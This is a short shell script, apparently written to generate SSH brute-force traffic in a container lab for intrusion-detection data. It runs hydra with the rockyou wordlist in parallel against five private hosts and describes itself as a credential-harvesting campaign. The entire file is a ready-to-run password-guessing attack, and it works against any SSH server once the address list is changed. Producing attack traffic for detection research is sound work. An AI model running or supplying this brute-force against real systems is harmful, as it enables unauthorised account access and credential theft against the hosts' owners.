#!/bin/sh
# ssh_bruteforce.sh — SSH brute-force against victim_ssh (172.20.0.11:2222)
# Generates SSH-Patator-style flows: many short TCP connections, psh_flag_ratio > 0.
# SSH is on port 22 in victim_node (standard sshd, not linuxserver/openssh-server).
# All 5 nodes targeted in parallel — realistic credential-harvesting campaign.
PORT=${1:-22}
WORDLIST=${2:-/usr/share/wordlists/rockyou.txt}
USER=${3:-testuser}

VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"

echo "[attack] SSH brute-force -> all nodes  $USER:$PORT  (wordlist: $WORDLIST)"
for ip in $VICTIMS; do
    hydra -l "$USER" -P "$WORDLIST" -s "$PORT" -t 4 ssh://"$ip" &
done
wait
